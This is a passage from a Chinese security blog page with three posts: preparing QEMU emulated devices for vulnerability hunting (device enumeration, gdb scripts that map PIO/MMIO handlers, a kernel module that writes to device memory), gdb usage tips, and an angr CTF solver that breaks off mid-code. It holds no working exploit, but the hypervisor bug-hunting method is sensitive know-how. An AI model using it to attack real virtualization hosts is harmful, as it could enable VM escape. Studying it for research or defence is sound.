PCI</span><br><span class="line">name &quot;edu&quot;, bus PCI</span><br><span class="line">name &quot;fw_cfg_io&quot;, bus System</span><br><span class="line">name &quot;fw_cfg_mem&quot;, bus System</span><br><span class="line">name &quot;generic-sdhci&quot;, bus System</span><br><span class="line">name &quot;hpet&quot;, bus System</span><br><span class="line">name &quot;i8042&quot;, bus ISA</span><br><span class="line">name &quot;igd-passthrough-isa-bridge&quot;, bus PCI, desc &quot;ISA bridge faked to support IGD PT&quot;</span><br><span class="line">name &quot;intel-iommu&quot;, bus System</span><br><span class="line">name &quot;ioapic&quot;, bus System</span><br><span class="line">name &quot;ipmi-bmc-extern&quot;</span><br><span class="line">name &quot;ipmi-bmc-sim&quot;</span><br><span class="line">name &quot;isa-ipmi-bt&quot;, bus ISA</span><br><span class="line">name &quot;isa-ipmi-kcs&quot;, bus ISA</span><br><span class="line">name &quot;kvm-ioapic&quot;, bus System</span><br><span class="line">name &quot;kvmclock&quot;, bus System</span><br><span class="line">name &quot;kvmvapic&quot;, bus System</span><br><span class="line">name &quot;loader&quot;, desc &quot;Generic Loader&quot;</span><br><span class="line">name &quot;mptsas1068&quot;, bus PCI, desc &quot;LSI SAS 1068&quot;</span><br><span class="line">name &quot;nvdimm&quot;, desc &quot;DIMM memory module&quot;</span><br><span class="line">name &quot;pc-dimm&quot;, desc &quot;DIMM memory module&quot;</span><br><span class="line">name &quot;sd-card&quot;, bus sd-bus</span><br><span class="line">name &quot;tpm-tis&quot;, bus ISA</span><br><span class="line">name &quot;unimplemented-device&quot;, bus System</span><br><span class="line">name &quot;virtio-gpu-device&quot;, bus virtio-bus</span><br><span class="line">name &quot;vmgenid&quot;</span><br></pre></td></tr></table></figure>

<p>若想了解设备的使用信息可以这样:</p>
<p>$ qemu-system-x86_64 -device mptsas1068,help</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ qemu-system-x86_64 -device mptsas1068,help</span><br><span class="line">mptsas1068.rombar=uint32</span><br><span class="line">mptsas1068.x-pcie-lnksta-dllla=bool (on/off)</span><br><span class="line">mptsas1068.multifunction=bool (on/off)</span><br><span class="line">mptsas1068.msi=OnOffAuto (on/off/auto)</span><br><span class="line">mptsas1068.romfile=str</span><br><span class="line">mptsas1068.command_serr_enable=bool (on/off)</span><br><span class="line">mptsas1068.x-pcie-extcap-init=bool (on/off)</span><br><span class="line">mptsas1068.addr=int32 (Slot and optional function number, example: 06.0 or 06)</span><br><span class="line">mptsas1068.sas_address=uint64</span><br></pre></td></tr></table></figure>

<p>通过以上命令，可以找到当前版本的qemu支持的所有设备类型和设备名称，以及各个设备的详细参数列表。</p>
<p>选取想要测试的设备，在qemu启动vm时，指定设备名称。如我们想要测试vga显卡与ne2k_pci网卡，使用如下命令启动vm:</p>
<p>$ qemu-system-x86_64 -enable-kvm -smp 1 -m 1024 -hda ./ubuntu64.img -boot c -vnc 0.0.0.0:8 -device VGA -device ne2k_pci &amp;</p>
<blockquote>
<ul>
<li>-enable-kvm 开启内核支持，加快qemu运行效率</li>
<li>-vnc 0.0.0.0:8 指定vm vnc端口为hostip:5908</li>
<li>-device VGA -device ne2k_pci  指定待测试的显卡与网卡</li>
<li>&amp; 程序后台启动，不启动qemu界面</li>
</ul>
</blockquote>
<h2 id="确定设备对应的IO端口-IO内存"><a href="#确定设备对应的IO端口-IO内存" class="headerlink" title="确定设备对应的IO端口/IO内存"></a>确定设备对应的IO端口/IO内存</h2><p>在运行vm时，我们指定视频设备vga与网卡设备vmxnet3,那我们在运行的vm中来查看设备IO端口地址或者IO内存地址，然后我们可以通过读写设备PIO或者设备内存地址。然后我们通过gdb脚本来找到对应PIO端口/内存端口读写触发的处理函数。</p>
<ol>
<li>执行lspci -nnv，查看vm pci设备。 <img ser="/qemu/devices.png">) 这个设备对应的IO端口是 0xc000,大小为256(意味着最大可以inl(0xc000+255)).</li>
<li>针对ne2k设备,从 lspci -nnv命令,我们知道其对应的bus信息是 00:04.0 ,我们也可以通过下列方式获取对应的IO内存和端口的信息.</li>
</ol>
<blockquote>
<ul>
<li><table>
<thead>
<tr>
<th>cat /proc/ioports</th>
<th>grep 00:04.0</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
<li><table>
<thead>
<tr>
<th>cat /proc/iomem</th>
<th>grep 00:04.0</th>
</tr>
</thead>
<tbody><tr>
<td></td>
<td></td>
</tr>
</tbody></table>
</li>
</ul>
</blockquote>
<h4 id="查看设备IO处理函数"><a href="#查看设备IO处理函数" class="headerlink" title="查看设备IO处理函数"></a>查看设备IO处理函数</h4><p>在host上执行ps -aux | grep qemu, 查看qemu进程PID(如：6666)，gdb -p 6666，为了方便操作编写gdb脚本：</p>
<p><strong>gdbinit.txt</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">set confirm off</span><br><span class="line">set pagination off</span><br><span class="line">set disassembly-flavor intel</span><br><span class="line">handle SIGALRM nostop nopass noprint</span><br><span class="line">disp /i $pc</span><br><span class="line"></span><br><span class="line">define p</span><br><span class="line">si</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define o</span><br><span class="line">ni</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define l</span><br><span class="line">x/16i $arg0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define ln</span><br><span class="line">x/16i</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define d</span><br><span class="line">x/16xg $arg0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define dn</span><br><span class="line">x/16xg</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define ds</span><br><span class="line">x/s $arg0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define dr</span><br><span class="line">print/x $$arg0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define pv</span><br><span class="line">print/x &#123;int&#125;$arg0</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">define pc</span><br><span class="line">x/i $pc</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>在断点处执行gdb脚本获取qemu程序中各IO地址与内存中对应的注册函数：(gdb脚本涉及太多的程序数据结构分析，在此不展开)</p>
<p><strong>Qemu启动后所有的pio设备信息：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">set pagination off</span><br><span class="line">set $dispatch = address_space_io.dispatch</span><br><span class="line">set $sections = $dispatch-&gt;map-&gt;sections</span><br><span class="line">printf &quot;sections=0x%lx\n&quot;, $sections</span><br><span class="line"></span><br><span class="line">set $count = address_space_io.dispatch-&gt;map.sections_nb</span><br><span class="line">printf &quot;total %lu entries.\n&quot;, $count</span><br><span class="line">while ($count &gt; 0)</span><br><span class="line">    set $size = *(short*)(&amp;$sections-&gt;size)</span><br><span class="line">    set $addr = $sections-&gt;offset_within_address_space</span><br><span class="line">    printf &quot;port=0x%04lx, size=0x%04lx, next=0x%04lx, &quot;, $addr, $size, $addr + $size</span><br><span class="line"></span><br><span class="line">    set $mr = $sections-&gt;mr</span><br><span class="line">    set $ops = $mr-&gt;ops</span><br><span class="line">    set $pf_read = $ops</span><br><span class="line">    printf &quot;0x%016lx, &quot;, $pf_read</span><br><span class="line">    x/8xb $ops</span><br><span class="line"></span><br><span class="line">    set $count = $count - 1</span><br><span class="line">    set $sections = $sections + 1</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">printf &quot;total %lu entries.\n&quot;, $count</span><br></pre></td></tr></table></figure>

<p>设备PIO信息截图：</p>
<p><img src="/qemu/pio.png" alt="pio"></p>
<p><strong>Qemu启动后所有的mmio设备信息：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">set pagination off</span><br><span class="line">set $dispatch = address_space_memory.dispatch</span><br><span class="line">set $sections = $dispatch-&gt;map-&gt;sections</span><br><span class="line">printf &quot;sections=0x%lx\n&quot;, $sections</span><br><span class="line"></span><br><span class="line">set $count = address_space_memory.dispatch-&gt;map.sections_nb</span><br><span class="line">printf &quot;total %lu entries.\n&quot;, $count</span><br><span class="line">while ($count &gt; 0)</span><br><span class="line">set $size = *(long*)(&amp;$sections-&gt;size)</span><br><span class="line">set $addr = $sections-&gt;offset_within_address_space</span><br><span class="line">printf &quot;addr=0x%08lx, size=0x%08lx, next=0x%08lx, &quot;, $addr, $size, $addr + $size</span><br><span class="line"></span><br><span class="line">set $mr = $sections-&gt;mr</span><br><span class="line">set $ops = $mr-&gt;ops</span><br><span class="line">set $pf_read = $ops</span><br><span class="line">printf &quot;0x%016lx, &quot;, $pf_read</span><br><span class="line">x/8xb $ops</span><br><span class="line"></span><br><span class="line">set $count = $count - 1</span><br><span class="line">set $sections = $sections + 1</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">printf &quot;total %lu entries.\n&quot;, $count</span><br></pre></td></tr></table></figure>

<p>设备PIO信息截图：</p>
<p><img src="/qemu/mmio.png" alt="mmio"></p>
<p>打开source insight, 路径/hw/net/Ne2000.c,从pio信息图中得到ne2k_pci设备PIO端口的处理函数是ne2000_ops： <img src="/qemu/source.png" alt="source"></p>
<p>在 .read = ne2000_read, .write =  ne2000_write,函数处打断点，然后编写程序读写PIO端口或者MMIO内存，就可以在断点处断下来，结合gdb调试以及IDA堆qemu可执行程序综合分析，就可以深入的堆qemu设备进行分析了。结合攻击模式库以及对漏洞的敏感度，进行漏洞挖掘工作。</p>
<h3 id="交互代码"><a href="#交互代码" class="headerlink" title="交互代码"></a>交互代码</h3><p>MMIO读写驱动程序：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/io.h&gt;</span><br><span class="line">void main()&#123;</span><br><span class="line">  iopl(3);</span><br><span class="line">  inb(0xc050);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//针对IO内存</span><br><span class="line">#include &lt;asm/io.h&gt;</span><br><span class="line">#include &lt;linux/module.h&gt;</span><br><span class="line">#include &lt;linux/ioport.h&gt;</span><br><span class="line">#include &lt;linux/random.h&gt;</span><br><span class="line"> </span><br><span class="line">long pmem; //注意这里不要使用指针类型,不然后面地址加偏移的时候很容易出错</span><br><span class="line">void m_init()&#123;</span><br><span class="line">	printk(&quot;m_init\n&quot;);</span><br><span class="line">	int i,cmd,cmd_size;</span><br><span class="line">	int va,offset;</span><br><span class="line">	pmem=ioremap(0xfebf0000,0x8000);//映射io内存</span><br><span class="line">	offset=0x10;//根据设备情况而定</span><br><span class="line">	if (pmem)&#123;</span><br><span class="line">	     writel(value,pmem+offset);//通常情况下都是写4字节,你也可以根据源码的处理方式选择</span><br><span class="line">	&#125;else printk(&quot;ioremap fail\n&quot;);</span><br><span class="line">	iounmap(pmem);</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br><span class="line">void m_exit()&#123;</span><br><span class="line">	printk(&quot;m_exit\n&quot;);</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br><span class="line">module_init(m_init);</span><br><span class="line">module_exit(m_exit);</span><br></pre></td></tr></table></figure>

<h2 id="审计源码"><a href="#审计源码" class="headerlink" title="审计源码"></a>审计源码</h2><p>已经找到处理输入的文件了,怎么找到哪一个函数是第一个处理我们输入的函数呢??通用的方法:找包含 read,write  关键字的函数名.通过不断找函数的caller,我们最终会找到第一个处理的函数,而有的设备有多个映射IO内存和端口,就意味着有多个处理函数分别对应不同的内存和端口.自此能说的也不多了,你都已经知道怎么控制数据了,剩下就是去查看qemu怎么处理数据了.qemu在获取数据的时候也会通过调用Guest系统的内存来读取数据,处理guest地址转换的函数叫  dma_memory_read,dma_memory_write。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>qemu是个非常强大的软件，也是虚拟化、云计算的基础；在硬件模拟方面，模拟各平台设备；用于源码插桩，linux内核调试等。 以上总结要感谢实验室大牛莫老师指导，非常感谢！！！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="http://www.tuicool.com/articles/MzqYbia" target="_blank" rel="noopener">QEMU漏洞挖掘</a></li>
</ul>

          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/05/05/gdb/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/05/05/gdb/" class="post-title-link" itemprop="url">some useful gdb skills</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2018-05-05 12:00:00" itemprop="dateCreated datePublished" datetime="2018-05-05T12:00:00+08:00">2018-05-05</time>
            

            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2018/05/05/gdb/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/05/05/gdb/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="some-useful-gdb-skills"><a href="#some-useful-gdb-skills" class="headerlink" title="some useful gdb skills"></a>some useful gdb skills</h1><h4 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h4><p>经常使用gdb peda调试程序，一直没有阅读gdb手册，此篇作为一个阅读笔记，工作中更多的喜欢使用gdb python脚本。</p>
<ul>
<li><a href="https://sourceware.org/gdb/current/onlinedocs/gdb/Python.html#Python" target="_blank" rel="noopener">gdb python</a></li>
<li><a href="https://stfpeak.github.io/2017/11/08/pwn2win_reverse_Achievement_Unlock/" target="_blank" rel="noopener">gdb python 实例</a></li>
</ul>
<h4 id="gdb带参数启动"><a href="#gdb带参数启动" class="headerlink" title="gdb带参数启动"></a>gdb带参数启动</h4><ol>
<li>gdb –args xxx arg0 arg1 …</li>
<li>gdb   &amp;  set args xxx arg0 arg1 …</li>
</ol>
<h4 id="将GDB中需要的调试信息输出到文件"><a href="#将GDB中需要的调试信息输出到文件" class="headerlink" title="将GDB中需要的调试信息输出到文件"></a>将GDB中需要的调试信息输出到文件</h4><ol>
<li>$ (gdb) set logging file &lt;文件名&gt; 设置输出的文件名称</li>
<li>$ (gdb) set logging on 输入这个命令后，此后的调试信息将输出到指定文件</li>
<li>$ (gdb) thread apply all bt 打印说有线程栈信息</li>
<li>$ (gdb) set logging off 输入这个命令，关闭到指定文件的输出</li>
</ol>
<h4 id="set-pagination-off"><a href="#set-pagination-off" class="headerlink" title="set pagination off"></a>set pagination off</h4><ol>
<li>disable —Type  to continue, or q  to quit—</li>
</ol>
<h4 id="程序继续执行"><a href="#程序继续执行" class="headerlink" title="程序继续执行"></a>程序继续执行</h4><ol>
<li>continue [ignore-count]</li>
<li>c [ignore-count]</li>
<li>fg [ignore-count] 恢复程序运行，直到程序结束，或是下一个断点到来。 <strong>ignore-count表示忽略其后的断点次数。</strong></li>
</ol>
<h4 id="step-mode"><a href="#step-mode" class="headerlink" title="step mode"></a>step mode</h4><ol>
<li>set step-mode on  打开step-mode模式，于是，在进行单步跟踪时，程序不会因为没有debug信息而不停住,这个参数有很利于查看机器码。</li>
<li>set step-mod off 关闭step-mode模式。</li>
</ol>
<h4 id="查看-amp-amp-设置gdb环境变量"><a href="#查看-amp-amp-设置gdb环境变量" class="headerlink" title="查看&amp;&amp;设置gdb环境变量"></a>查看&amp;&amp;设置gdb环境变量</h4><ol>
<li>show env 查看环境变量</li>
<li>set env AAA=aaa 设置环境变量AAA</li>
</ol>
<h4 id="查看程序运行的状态"><a href="#查看程序运行的状态" class="headerlink" title="查看程序运行的状态"></a>查看程序运行的状态</h4><ol>
<li><p>info program  来查看程序的是否在运行，进程号，被暂停的原因。     </p>
<blockquote>
<p>分别有<em>遇见断点，</em>遇见断点后的step, <em>程序停止，</em>信号让程序停止以及*程序接收输入。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt; def get_status(self):</span><br><span class="line">&gt;      status = &quot;UNKNOWN&quot;</span><br><span class="line">&gt;      out = gdb.execute(&quot;info program&quot;, to_string=True)</span><br><span class="line">&gt;      for line in out.splitlines():</span><br><span class="line">&gt;          if line.startswith(&quot;It stopped&quot;):</span><br><span class="line">&gt;              if &quot;signal&quot; in line: # stopped by signal</span><br><span class="line">&gt;                  status = line.split(&quot;signal&quot;)[1].split(&quot;,&quot;)[0].strip()</span><br><span class="line">&gt;                  break</span><br><span class="line">&gt;              if &quot;breakpoint&quot; in line: # breakpoint hit</span><br><span class="line">&gt;                  status = &quot;BREAKPOINT&quot;</span><br><span class="line">&gt;                  break</span><br><span class="line">&gt;          if &quot;not being run&quot; in line:</span><br><span class="line">&gt;              status = &quot;STOPPED&quot;</span><br><span class="line">&gt;              break</span><br><span class="line">&gt;      return status        </span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
</ol>
<p>遇见断点后step Program stopped at 0x484e41. It stopped after being stepped.</p>
<p>程序接收输入 Program stopped at (0x7f549b1936f0) e.g</p>
<h4 id="调试多个子程序"><a href="#调试多个子程序" class="headerlink" title="调试多个子程序"></a>调试多个子程序</h4><p>GDB允许在一个单独的session里面调试多个程序。有些系统允许GDB同时运行多个程序，更一般的情况，在每一个进程中有多个线程执行。 GDB用 <strong>inferior</strong> 来表示每个程序执行，inferior与进程对应，也可用于没有进程的target。Inferiors在进程运行之前创建，在进程退出之后保留。Inferior也有自己的标记，这个标记与PID不同。</p>
<h4 id="store-load-调试程序的断点到文件"><a href="#store-load-调试程序的断点到文件" class="headerlink" title="store/load 调试程序的断点到文件"></a>store/load 调试程序的断点到文件</h4><ol>
<li>save breakpoints break.cfg</li>
<li>source break.cfg</li>
</ol>
<h4 id="定义钩子命令"><a href="#定义钩子命令" class="headerlink" title="定义钩子命令"></a>定义钩子命令</h4><p>钩子用来在执行某个命令前或命令后，先执行某个或某些命令。 假如想在执行print命令前显示一段 “———-”，则：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define hook-print</span><br><span class="line">echo ----------/n</span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p><strong>注意“hook-”后接的必须是命令全称，不能是缩写。</strong></p>
<p>如果想在命令执行完之后，再执行某个或某些命令，则：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">define hookpost-print</span><br><span class="line">echo ----------/n</span><br><span class="line">end</span><br></pre></td></tr></table></figure>
          
        
      
    </div>

    

    
    
    

    

    
      
    
    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://idongxia.github.io/2018/03/07/angr/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="idongxia">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="idongxia">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                
                <a href="/2018/03/07/angr/" class="post-title-link" itemprop="url">How to use angr for CTF</a>
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">

            
            
            

            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Veröffentlicht am</span>
              

              
                
              

              <time title="Erstellt: 2018-03-07 12:00:00" itemprop="dateCreated datePublished" datetime="2018-03-07T12:00:00+08:00">2018-03-07</time>
            

            
          </span>

          

          
            
            
              
              <span class="post-comments-count">
                <span class="post-meta-divider">|</span>
                <span class="post-meta-item-icon">
                  <i class="fa fa-comment-o"></i>
                </span>
            
                <span class="post-meta-item-text">Kommentare: </span>
                <a href="/2018/03/07/angr/#comments" itemprop="discussionUrl">
                  <span class="post-comments-count valine-comment-count" data-xid="/2018/03/07/angr/" itemprop="commentCount"></span>
                </a>
              </span>
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="How-to-use-angr-for-CTF"><a href="#How-to-use-angr-for-CTF" class="headerlink" title="How to use angr for CTF"></a>How to use angr for CTF</h1><h4 id="什么是angr"><a href="#什么是angr" class="headerlink" title="什么是angr?"></a>什么是angr?</h4><p>angr是一个二进制代码分析工具，能够自动化完成二进制文件的分析，并找出漏洞。在二进制代码中寻找并且利用漏洞是一项非常具有挑战性的工作，它的挑战性主要在于人工很难直观的看出二进制代码中的数据结构、控制流信息等。angr是一个基于python的二进制漏洞分析框架，它将以前多种分析技术集成进来，­­­它能够进行动态的符号执行分析（如，KLEE和Mayhem），也能够进行多种静态分析。</p>
<h4 id="angr过程简述"><a href="#angr过程简述" class="headerlink" title="angr过程简述"></a>angr过程简述</h4><p>1）将二进制程序载入angr分析系统</p>
<p>2）将二进制程序转换成中间件语言（intermediate representation, IR）</p>
<p>3）将IR语言转换成语义较强的表达形式，比如，这个程序做了什么，而不是它是什么。</p>
<p>4）执行进一步的分析，比如，完整的或者部分的静态分析（依赖关系分析，程序分块）、程序空间的符号执行探索（挖掘溢出漏洞）、一些对于上面方式的结合。</p>
<h4 id="angr安装"><a href="#angr安装" class="headerlink" title="angr安装"></a>angr安装</h4><p><strong>Linux</strong></p>
<p>$ apt-get install python-dev libffi-dev build-essential virtualenvwrapper</p>
<p>$ mkvirtualenv angr &amp;&amp; pip install angr</p>
<h4 id="简单例子"><a href="#简单例子" class="headerlink" title="简单例子"></a>简单例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import angr</span><br><span class="line">main = 0x4007DA</span><br><span class="line">find = 0x404FBC</span><br><span class="line">avoid = [0x400590]</span><br><span class="line">p = angr.Project(&apos;./angrybird2&apos;)</span><br><span class="line">init = p.factory.blank_state(addr=main)</span><br><span class="line">pg = p.factory.path_group(init, threads=8)</span><br><span class="line">ex = pg.explore(find=find, avoid=avoid)</span><br><span class="line">final = ex.found[0].state</span><br><span class="line">flag = final.posix.dumps(0)</span><br><span class="line">print(&quot;Flag: &#123;0&#125;&quot;.format(final.posix.dumps(1)))</span><br></pre></td></tr></table></figure>

<h4 id="执行程序然后从标准输入输入数据"><a href="#执行程序然后从标准输入输入数据" class="headerlink" title="执行程序然后从标准输入输入数据"></a>执行程序然后从标准输入输入数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># coding: utf-8</span><br><span class="line">import angr</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    # Load the binary. This is a 64-bit C++ binary, pretty heavily obfuscated.</span><br><span class="line">    p = angr.Project(&apos;wyvern&apos;)</span><br><span class="line"></span><br><span class="line">    # This block constructs the initial program state for analysis.</span><br><span class="line">    # Because we&apos;re going to have to step deep into the C++ standard libraries</span><br><span class="line">    # for this to work, we need to run everyone&apos;s initializers. The full_init_state</span><br><span class="line">    # will do that. In order to do this peformantly, we will use the unicorn engine!</span><br><span class="line">    st = p.factory.full_init_state(args=[&apos;./wyvern&apos;], add_options=angr.options.unicorn)</span><br><span class="line"></span><br><span class="line">    # It&apos;s reasonably easy to tell from looking at the program in IDA that the key will</span><br><span class="line">    # be 29 bytes long, and the last byte is a newline.</span><br><span class="line"></span><br><span class="line">    # Constrain the first 28 bytes to be non-null and non-newline:</span><br><span class="line">    for _ in xrange(28):</span><br><span class="line">        k = st.posix.files[0].read_from(1)</span><br><span class="line">        st.se.add(k != 0)</span><br><span class="line">        st.se.add(k != 10)</span><br><span class="line"></span><br><span class="line">    # Constrain the last byte to be a newline</span><br><span class="line">    k = st.posix.files[0].read_from(1)</span><br><span class="line">    st.se.add(k == 